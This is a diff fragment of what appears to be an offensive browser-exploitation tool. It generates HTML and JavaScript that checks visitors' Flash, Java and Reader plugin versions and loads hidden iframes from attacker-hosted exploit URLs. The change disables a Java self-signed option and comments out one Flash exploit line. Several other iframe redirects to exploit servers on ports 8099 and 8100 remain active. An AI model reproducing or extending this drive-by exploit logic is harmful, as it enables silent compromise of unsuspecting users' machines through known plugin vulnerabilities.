@@ -8,7 +8,7 @@ import sys
 
 #If the fingerprintOnly options is set to True, the other options below is ignored
 fingerprintOnly=True
-javaSelfsigned=True
+javaSelfsigned=False
 runFlash=True
 runJava=True
 runReader=True
@@ -263,7 +263,7 @@ def modifyHTML(filename):
 					contentExploit.append("if((verMaj1>='11' && verMaj1<=12) || (verMaj1=='13' && verMaj2=='0' && verMaj3=='0' && verMaj4<=182)){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8099/adobe_flash_regex_value';\n")
-					contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<11.5.502.149)){iframe.setAttribute('src',url);}\n")
+					#contentExploit.append("if(plugin=='flash' && (verMaj12=='11,5' && verFullJoin<11.5.502.149)){iframe.setAttribute('src',url);}\n")
 
 					contentExploit.append("url = 'http://"+ipAddr+":8100/adobe_flash_rtmp';\n")
 					contentExploit.append("if(plugin=='flash' && verFull=='11,2,202,228'){iframe.setAttribute('src',url);}\n")
